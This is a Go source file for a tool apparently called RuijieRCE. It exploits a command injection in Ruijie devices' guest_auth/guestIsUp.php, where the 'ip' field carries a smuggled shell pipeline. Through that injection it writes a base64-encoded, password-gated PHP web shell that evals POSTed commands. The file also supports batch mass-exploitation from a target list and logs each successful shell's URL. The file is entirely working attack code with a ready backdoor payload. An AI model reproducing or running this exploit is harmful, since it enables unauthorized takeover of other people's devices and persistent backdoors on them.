package main

import (
	"bufio"
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

var (
	URL string
	FILE string
	NAME string
	PASS string
	shellcode = "PD9waHAgZXJyb3JfcmVwb3J0aW5nKDApO2lmIChoYXNoKCJzaGEyNTYiLCRfR0VUWyJwYXNzIl0pID09ICIwNGRjNWIyMTM2MzI4YTBkY2IxODlkZjk3NzM0YzdjNzJlNWUxMjI3ZmEwYzAzNDY5YTZjZTYwOGYzMmYxYjY2Iil7ZXZhbCgkX1BPU1RbImNtZCJdKTt9ID8+"
	//<?php error_reporting(0);if (hash("sha256",$_GET["pass"]) == "04dc5b2136328a0dcb189df97734c7c72e5e1227fa0c03469a6ce608f32f1b66"){eval($_POST["cmd"]);} ?>
	//默认密码cmd
)

var header = map[string]string{
	"User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
	"Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"Accept-Encoding" : "gzip, deflate",
	"Content-Type" : "application/x-www-form-urlencoded",
}

func init()  {
	flag.StringVar(&URL, "u", "", "目标URL")
	flag.StringVar(&FILE, "f", "", "导入.txt文件批量扫描")
	flag.StringVar(&NAME,"n", "", "自定义POST木马密码，默认cmd")
	flag.StringVar(&PASS, "p", "", "自定义GET密码验证，默认为cmd")
}

func addHistory(word string)  {
	//检测到漏洞时将URL信息写入history.txt
	file, err := os.OpenFile(
		"history.txt",
		os.O_WRONLY|os.O_APPEND|os.O_CREATE,
		0666,
	)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]无法写入history.txt", err)
		fmt.Printf("\n")
	}
	defer file.Close()
	// 写字节到文件中
	word = word + "\n"
	byteSlice := []byte(word)
	_ , err = file.Write(byteSlice)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]无法写入history.txt", err)
		fmt.Printf("\n")
	}
}

func check(target string, header map[string]string) (bool, error) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		return false, err
	}
	req.Header.Add("User-Agent", header["User-Agent"])
	req.Header.Add("Accept", header["Accept"])
	reqs, err := client.Do(req)
	if err != nil {
		return false, err
	}
	body, _ := ioutil.ReadAll(reqs.Body)
	defer reqs.Body.Close()

	if reqs.StatusCode == 200 &&  strings.Contains(string(body), "File not found") == false{
		addHistory(target)
		return true, nil
	}else {
		return false, nil
	}
}

func Url(s string) (string,string) {
	urll, _ := url.Parse(s)
	target := urll.Scheme + "://" + urll.Host + "/guest_auth/"
	rand.Seed(time.Now().UnixNano())
	shellname := strconv.Itoa(rand.Int()) + ".php"
	return target, shellname
}

func Rce(s, shellname, shellcode string, header map[string]string) (string, error) {
	target := s + "guestIsUp.php"
	data := "ip=127.0.0.1 | echo \"" + shellcode + "\" | base64 -d > " + shellname + " &mac=00-00"

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}
	req, err := http.NewRequest("POST", target,bytes.NewReader([]byte(data)))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", header["Content-Type"])
	req.Header.Add("User-Agent", header["User-Agent"])
	req.Header.Add("Accept", header["Accept"])
	req.Header.Add("Accept-Encoding", header["Accept-Encoding"])

	_, err = client.Do(req)
	if err != nil {
		return "", err
	}

	urll := s + shellname
	check, err := check(urll, header)
	switch  {
	case err != nil:
		return "", err
	case check == true:
		return urll, nil
	default:
		return "", nil
	}
}

func changePass(pass string) string {
	h := sha256.New()
	h.Write([]byte(pass))
	replace := hex.EncodeToString(h.Sum(nil))
	shell, _ := base64.StdEncoding.DecodeString(shellcode)
	data := strings.Replace(string(shell), "04dc5b2136328a0dcb189df97734c7c72e5e1227fa0c03469a6ce608f32f1b66", replace, -1)
	base := base64.StdEncoding.EncodeToString([]byte(data))
	return base
}

func changeName(name string) string {
	shell, _ := base64.StdEncoding.DecodeString(shellcode)
	data := strings.Replace(string(shell), "cmd", name, -1)
	base := base64.StdEncoding.EncodeToString([]byte(data))
	return base
}

func changeAll(pass, name string) string {
	h := sha256.New()
	h.Write([]byte(pass))
	replace := hex.EncodeToString(h.Sum(nil))
	shell, _ := base64.StdEncoding.DecodeString(shellcode)
	data := strings.Replace(string(shell), "04dc5b2136328a0dcb189df97734c7c72e5e1227fa0c03469a6ce608f32f1b66", replace, -1)
	base := base64.StdEncoding.EncodeToString([]byte(data))

	shell, _ = base64.StdEncoding.DecodeString(base)
	data = strings.Replace(string(shell), "cmd", name, -1)
	base = base64.StdEncoding.EncodeToString([]byte(data))
	return base
}

func judge(urll string)  {
	if urll != "" {
		fmt.Printf("\033[1;31m%s\033[0m\n","[+]成功写入shell：" + urll)
	}else {
		fmt.Printf("\033[1;32m%s\033[0m\n","[-]写入失败" + URL)
	}
}

func batch(shell, file string)  {
	fi, err := os.Open(file)
	if err != nil {
		fmt.Printf("\033[1;31m%s%v\033[0m\n","请输入正确信息", err)
	}
	defer fi.Close()

	br := bufio.NewReader(fi)
	for  {
		urll, _, eof := br.ReadLine()
		if eof == io.EOF {
			os.Exit(0)
		}
		target, shellname := Url(string(urll))
		urlll, err := Rce(target, shellname, shell, header)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]写入失败：" + URL + "", err)
			continue
		}
		judge(urlll)
	}
}

func Menu()  {
	now := time.Now()
	fmt.Printf("\033[1;35m%s\033[0m\n","  _____       _ _ _      _____   _____ ______ ")
	fmt.Printf("\033[1;35m%s\033[0m\n"," |  __ \\     (_|_|_)    |  __ \\ / ____|  ____|")
	fmt.Printf("\033[1;35m%s\033[0m\n"," | |__) |   _ _ _ _  ___| |__) | |    | |__   ")
	fmt.Printf("\033[1;35m%s\033[0m\n"," |  _  / | | | | | |/ _ \\  _  /| |    |  __|  ")
	fmt.Printf("\033[1;35m%s\033[0m\n"," | | \\ \\ |_| | | | |  __/ | \\ \\| |____| |____ ")
	fmt.Printf("\033[1;35m%s\033[0m\n"," |_|  \\_\\__,_|_| |_|\\___|_|  \\_\\\\_____|______|")
	fmt.Printf("\033[1;35m%s\033[0m\n","              _/ |                            ")
	fmt.Printf("\033[1;35m%s\033[0m\n","             |__/                             ")
	fmt.Printf("\033[1;35m%d-%02d-%02d %02d:%02d:%02d\033[0m\n", now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
	switch  {
	case PASS == "" && NAME == "":
		var word = "GET传参密码为：cmd，POST命令执行密码为：cmd"
		addHistory(word)
	case PASS != "" && NAME == "":
		var word = "GET传参密码为：" + PASS + "，POST命令执行密码为：cmd"
		addHistory(word)
	case PASS == "" && NAME != "":
		var word = "GET传参密码为：cmd，POST命令执行密码为：" + NAME + ""
		addHistory(word)
	case PASS != "" && NAME != "":
		var word = "GET传参密码为：" + PASS +"，POST命令执行密码为：" + NAME + ""
		addHistory(word)
	}
}

func main()  {
	flag.Parse()
	Menu()
	switch  {
	case URL != "" && FILE == "" && PASS == "" && NAME == "":
		target, shellname := Url(URL)
		urll, err := Rce(target, shellname, shellcode, header)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]Error", err)
			fmt.Print("\n")
			os.Exit(0)
		}
		judge(urll)

	case URL != "" && FILE == "" && PASS != "" && NAME == "":
		target, shellname := Url(URL)
		shell := changePass(PASS)
		urll, err := Rce(target, shellname, shell, header)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]Error", err)
			fmt.Print("\n")
			os.Exit(0)
		}
		judge(urll)

	case URL != "" && FILE == "" && PASS == "" && NAME != "":
		target, shellname := Url(URL)
		shell := changeName(NAME)
		urll, err := Rce(target, shellname, shell, header)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]Error", err)
			fmt.Print("\n")
			os.Exit(0)
		}
		judge(urll)

	case URL != "" && FILE == "" && PASS != "" && NAME != "":
		target, shellname := Url(URL)
		shell := changeAll(PASS, NAME)
		urll, err := Rce(target, shellname, shell, header)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]Error", err)
			fmt.Print("\n")
			os.Exit(0)
		}
		judge(urll)

	case URL == "" && FILE != "" && PASS == "" && NAME == "":
		batch(string(shellcode), FILE)


	case URL == "" && FILE != "" && PASS != "" && NAME == "":
		shell := changePass(PASS)
		batch(shell, FILE)


	case URL == "" && FILE != "" && PASS == "" && NAME != "":
		shell := changeName(NAME)
		batch(shell, FILE)


	case URL == "" && FILE != "" && PASS != "" && NAME != "":
		shell := changeAll(PASS, NAME)
		batch(shell, FILE)


	default:
		fmt.Printf("\033[1;31m%s\033[0m\n","请输入正确信息 ./RuijieRCE -h 查看参数信息")
	}

}
